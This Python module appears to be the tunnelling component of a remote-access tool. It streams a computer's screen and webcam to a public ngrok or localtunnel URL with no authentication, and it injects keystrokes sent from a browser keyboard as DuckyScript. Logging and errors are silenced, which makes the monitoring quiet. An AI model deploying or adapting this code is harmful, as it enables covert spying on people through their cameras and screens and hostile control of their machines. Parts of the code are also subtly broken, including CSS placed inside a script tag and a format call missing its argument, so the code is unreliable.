from pyngrok import ngrok
from py_localtunnel.tunnel import Tunnel

from io import BytesIO
from http.server import HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer

#Misc
import numpy as np
from threading import Thread
from .duckyscript import toducky
from pyautogui import screenshot
from .general import get_public_ip
from cv2 import cvtColor, resize, imencode, COLOR_BGR2RGB, VideoCapture


"""
ooooooooooooo                                               oooo  ooooo   ooooo                             .o8  oooo   o8o
8'   888   `8                                               `888  `888'   `888'                            "888  `888   `"'
     888      oooo  oooo  ooo. .oo.   ooo. .oo.    .ooooo.   888   888     888   .oooo.   ooo. .oo.    .oooo888   888  oooo  ooo. .oo.    .oooooooo
     888      `888  `888  `888P"Y88b  `888P"Y88b  d88' `88b  888   888ooooo888  `P  )88b  `888P"Y88b  d88' `888   888  `888  `888P"Y88b  888' `88b
     888       888   888   888   888   888   888  888ooo888  888   888     888   .oP"888   888   888  888   888   888   888   888   888  888   888
     888       888   888   888   888   888   888  888    .o  888   888     888  d8(  888   888   888  888   888   888   888   888   888  `88bod8P'
    o888o      `V88V"V8P' o888o o888o o888o o888o `Y8bod8P' o888o o888o   o888o `Y888""8o o888o o888o `Y8bod88P" o888o o888o o888o o888o `8oooooo.
                                                                                                                                         d"     YD
                                                                                                                                         "Y88888P'
"""
css = """
<script>
/* === Global Body === */
body {
    margin: 0;
    padding: 2em;
    background-color: #121212; /* deep dark background */
    color: #e0e0e0; /* light gray text */
    font-family: "Segoe UI", Roboto, Helvetica, sans-serif;
    text-align: center;
}

/* === Headings === */
h1 {
    font-size: 2rem;
    font-weight: 600;
    margin-bottom: 1em;
    color: #ffffff;
}

/* === Stream Image === */
img {
    border: 4px solid #333; /* dark border */
    border-radius: 12px;
    max-width: 90%;
    width: 800px;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
}

/* === Keyboard Container === */
#keyboard {
    margin-top: 30px;
    display: inline-block;
    user-select: none;
}

/* === Keyboard Rows === */
.row {
    display: flex;
    justify-content: center;
    margin-bottom: 6px;
}

/* === Keys === */
.key {
    background-color: #1e1e1e;
    color: #e0e0e0;
    border-radius: 6px;
    width: 42px;
    height: 42px;
    line-height: 42px;
    margin: 3px;
    cursor: pointer;
    font-size: 13px;
    text-align: center;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);
    transition: background 0.2s, transform 0.1s;
}

.key:hover {
    background-color: #333333;
    transform: translateY(-2px);
}

/* === Special Key Widths === */
.wide { width: 90px; }
.xwide { width: 130px; }
.space { width: 260px; }

/* === Active Key === */
.active {
    background-color: #555555 !important;
    box-shadow: inset 0 0 5px rgba(255, 255, 255, 0.2);
}

/* === Responsive adjustments === */
@media (max-width: 900px) {
    img { width: 90%; }
    .space { width: 60%; }
    .wide { width: 20%; }
    .xwide { width: 30%; }
}
</script>
"""

def generate_warning_for_url(url: str) -> str:
    """Return a warning line depending on the tunnel provider."""
    if "ngrok" in url.lower():
        return "\n⚠️ Using ngrok: streaming capacity may be limited."
    else:
        return "\n⚠️ Temporary link: this URL may expire after use."

class LocalTunnelRunner:
    def __init__(self):
        self._t = Tunnel()
        self._url = self._t.get_url("")

    def get_url(self) -> str:
        return self._url

    def get_tunnel(self) -> Tunnel:
        return self._t

    def stop_tunnel(self) -> None:
        self._t.stop_tunnel()

    def get_password(self) -> str:
        return get_public_ip()

    def start_tunnel(self, address: str, port: int) -> str:
        """
        starts the local tunnel and returns the password(aka your public ip)
        """
        Thread(target=self._t.create_tunnel, args=(port, address)).start()
        return self.get_password()

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    def handle_error(self, request, client_address):
        pass

class ScreenStreamHandler(BaseHTTPRequestHandler):
    def __init__(self, request, client_address, server):
        self.action_table = {
            "ducky": self.run_ducky
        }
        super().__init__(request, client_address, server)

    def run_ducky(self, payload: str) -> None:
        Thread(target=toducky, args=(payload, True)).start()

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/':
            html = """
<!DOCTYPE html>
<html>
<head>
    <title>Screen Stream</title>
    <meta charset="utf-8">
    {}
</head>

<body>

<h1>Live Screen Stream</h1>
<img src="/video" alt="Screen stream">

<div id="keyboard"></div>

<script>
let caps = false;
let modifiers = [];

function sendDucky(cmd) {
    fetch("/cmd?action=ducky&payload=" + encodeURIComponent(cmd));
}

function pressKey(key) {
    let ducky = "";

    if (key === "CAPS") {
        caps = !caps;
        sendDucky("CAPSLOCK");
        document.getElementById("caps").classList.toggle("active", caps);
        return;
    }

    if (["CTRL","ALT","SHIFT","GUI"].includes(key)) {
        if (modifiers.includes(key)) {
            modifiers = modifiers.filter(k => k !== key);
            sendDucky(key); // send standalone modifier if toggled off
        } else {
            modifiers.push(key);
        }
        document.getElementById(key).classList.toggle("active");
        return;
    }

    if (modifiers.length) {
        ducky = modifiers.join(" ") + " " + key;
        modifiers.forEach(m => document.getElementById(m).classList.remove("active"));
        modifiers = [];
    } else if (key.length === 1) {
        ducky = "STRING " + (caps ? key.toUpperCase() : key.toLowerCase());
    } else {
        ducky = key;
    }

    sendDucky(ducky);
}

const layout = [
    ["ESC","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"],
    ["`","1","2","3","4","5","6","7","8","9","0","-","=","BACKSPACE"],
    ["TAB","Q","W","E","R","T","Y","U","I","O","P","[","]","\\\\"],
    ["CAPS","A","S","D","F","G","H","J","K","L",";","'","ENTER"],
    ["SHIFT","Z","X","C","V","B","N","M",",",".","/","SHIFT"],
    ["CTRL","GUI","ALT","SPACE","ALT","GUI","CTRL"],
    ["UP"],
    ["LEFT","DOWN","RIGHT"]
];

const keyboard = document.getElementById("keyboard");

layout.forEach(row => {
    const rowDiv = document.createElement("div");
    rowDiv.className = "row";

    row.forEach(key => {
        const k = document.createElement("div");
        k.className = "key";
        k.textContent = key;
        k.onclick = () => pressKey(key);

        if (["BACKSPACE","ENTER","SHIFT","CAPS","TAB"].includes(key))
            k.classList.add("wide");

        if (key === "SPACE")
            k.classList.add("space");

        if (key === "CAPS")
            k.id = "caps";
        if (["CTRL","ALT","SHIFT","GUI"].includes(key)) k.id = key;

        rowDiv.appendChild(k);
    });

    keyboard.appendChild(rowDiv);
});
</script>

</body>
</html>
            """.format(css).encode()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-length', str(len(html)))
            self.end_headers()
            self.wfile.write(html)

        elif parsed.path == '/video':
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            try:
                while True:
                    screenshot_out = screenshot()
                    with BytesIO() as output:
                        screenshot_out.save(output, format="JPEG")
                        frame = output.getvalue()
                    self.wfile.write(b"--frame\r\n")
                    self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
            except (BrokenPipeError, ConnectionResetError):
                pass

        elif parsed.path == '/cmd':
            params = parse_qs(parsed.query)
            action = params.get('action', [None])[0]
            payload = params.get('payload', [""])[0]

            if not(action in self.action_table):
                self.send_error(400, "Invalid action")
                return
            fun = self.action_table[action]
            fun(payload)

            self.send_response(204)
            self.end_headers()
            return

        else:
            self.send_error(404)

def webcamandscreenstreamhandlermaker(cap):
    class WebcamAndScreenStreamHandler(BaseHTTPRequestHandler):
        def __init__(self, request, client_address, server):
            self.action_table = {
                "ducky": self.run_ducky
            }
            super().__init__(request, client_address, server)
        
        def run_ducky(self, payload: str) -> None:
            Thread(target=toducky, args=(payload, True)).start()

        def log_message(self, format, *args):
            pass

        def do_GET(self):
            parsed = urlparse(self.path)
            if self.path == '/':
                html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Webcam&Screen Stream</title>
                <meta charset="utf-8">
                {}
            </head>

            <body>

            <h1>Live Webcam&Screen Stream</h1>
            <img src="/video" alt="Webcam stream">

            <div id="keyboard"></div>

            <script>
            let caps = false;
            let modifiers = [];

            function sendDucky(cmd) {
                fetch("/cmd?action=ducky&payload=" + encodeURIComponent(cmd));
            }

            function pressKey(key) {

                if (key === "CAPS") {
                    caps = !caps;
                    sendDucky("CAPSLOCK");
                    document.getElementById("caps").classList.toggle("active", caps);
                    return;
                }

                if (["CTRL","ALT","SHIFT","GUI"].includes(key)) {
                    if (modifiers.includes(key)) {
                        modifiers = modifiers.filter(k => k !== key);
                    } else {
                        modifiers.push(key);
                    }
                    document.getElementById(key).classList.toggle("active");
                    return;
                }

                let ducky = "";

                if (modifiers.length) {
                    ducky = modifiers.join(" ") + " " + key;
                    modifiers.forEach(m => document.getElementById(m).classList.remove("active"));
                    modifiers = [];
                } else if (key.length === 1) {
                    ducky = "STRING " + (caps ? key.toUpperCase() : key.toLowerCase());
                } else {
                    ducky = key;
                }

                sendDucky(ducky);
            }

            const layout = [
                ["ESC","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"],
                ["`","1","2","3","4","5","6","7","8","9","0","-","=","BACKSPACE"],
                ["TAB","Q","W","E","R","T","Y","U","I","O","P","[","]","\\\\"],
                ["CAPS","A","S","D","F","G","H","J","K","L",";","'","ENTER"],
                ["SHIFT","Z","X","C","V","B","N","M",",",".","/","SHIFT"],
                ["CTRL","GUI","ALT","SPACE","ALT","GUI","CTRL"],
                ["UP"],
                ["LEFT","DOWN","RIGHT"]
            ];

            const keyboard = document.getElementById("keyboard");

            layout.forEach(row => {
                const rowDiv = document.createElement("div");
                rowDiv.className = "row";

                row.forEach(key => {
                    const k = document.createElement("div");
                    k.className = "key";
                    k.textContent = key;
                    k.onclick = () => pressKey(key);

                    if (["BACKSPACE","ENTER","SHIFT","CAPS","TAB"].includes(key))
                        k.classList.add("wide");

                    if (key === "SPACE")
                        k.classList.add("space");

                    if (key === "CAPS") k.id = "caps";
                    if (["CTRL","ALT","SHIFT","GUI"].includes(key)) k.id = key;

                    rowDiv.appendChild(k);
                });

                keyboard.appendChild(rowDiv);
            });
            </script>

            </body>
            </html>
            """.format(css).encode()

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)

            elif parsed.path == '/cmd':
                params = parse_qs(parsed.query)
                action = params.get('action', [None])[0]
                payload = params.get('payload', [""])[0]

                if not(action in self.action_table):
                    self.send_error(400, "Invalid action")
                    return
                fun = self.action_table[action]
                fun(payload)

                self.send_response(204)
                self.end_headers()
                return

            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        img = screenshot()
                        img = np.array(img)
                        img = cvtColor(img, COLOR_BGR2RGB)
                        ret, frame = cap.read()
                        fr_height, fr_width, _ = frame.shape
                        frame = resize(frame, (fr_width//2, fr_height//2))
                        fr_height, fr_width, _ = frame.shape
                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', img)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamAndScreenStreamHandler

def webcamstreamhandlermaker(cap):
    class WebcamStreamHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            if self.path == '/':
                html = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Webcam Stream</title>
                    {} 
                </head>
                <body>
                    <h1>Live Webcam Stream</h1>
                    <img src="/video" alt="Webcam stream">
                </body>
                </html>
                """.format().encode()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)
            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        ret, frame = cap.read()
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', frame)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamStreamHandler


class MJPEGServer:
    def __init__(self, port=8081, handler=None, tunnel_backend='ngrok'):
        """
        tunnel_backend: 'ngrok' or 'localtunnel' or any object implementing create_tunnel(port, addr) and get_url()
        """
        self.port = port
        self.handler = handler
        self.server = None
        self.tunnel = None

        if tunnel_backend == 'ngrok':
            self.tunnel = 'ngrok'  
        elif tunnel_backend == 'localtunnel':
            self.tunnel = LocalTunnelRunner()
        else:
            
            self.tunnel = tunnel_backend

    def start(self) -> tuple[str, str|None]:
        """
        Starts the server and return a tuple with url and eventually a password or else None.
        
        :rtype: tuple[str, str | None]
        """
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), self.handler)
        Thread(target=self.server.serve_forever, daemon=True).start()
        password = None

        if self.tunnel == 'ngrok':
            self.tunnel = ngrok.connect(self.port, "http")
            return self.tunnel.public_url, password
        elif isinstance(self.tunnel, LocalTunnelRunner):
            password = self.tunnel.start_tunnel('127.0.0.1', self.port)
            url = self.tunnel.get_url()  
            return url, password
        else:
            self.tunnel.create_tunnel(self.port, '127.0.0.1')
            return self.tunnel.get_url(), password

    def stop(self):
        if isinstance(self.tunnel, str) and self.tunnel == 'ngrok':
            return
        if hasattr(self.tunnel, 'stop_tunnel'):
            self.tunnel.stop_tunnel()
        if self.server:
            self.server.shutdown()

class TunnelManager:
    def __init__(self, tunnel_backend='ngrok'):
        self.services = {}
        self.tunnel_backend = tunnel_backend

    def start_screen_stream(self, name="screen", port=8081):
        server = MJPEGServer(port, ScreenStreamHandler, tunnel_backend=self.tunnel_backend)
        url, password = server.start()
        self.services[name] = server
        return url, password

    def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamstreamhandlermaker(cap), tunnel_backend=self.tunnel_backend)
        url, password = server.start()
        self.services[name] = server
        return url, password

    def start_webcam_and_screen_stream(self, name="webcamandscreen", port=8023, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamandscreenstreamhandlermaker(cap), tunnel_backend=self.tunnel_backend)
        url, password = server.start()
        self.services[name] = server
        return url, password

    def stop_service(self, name):
        if name in self.services:
            self.services[name].stop()
            del self.services[name]
            return True
        return False

    def list_services(self):
        return list(self.services.keys())
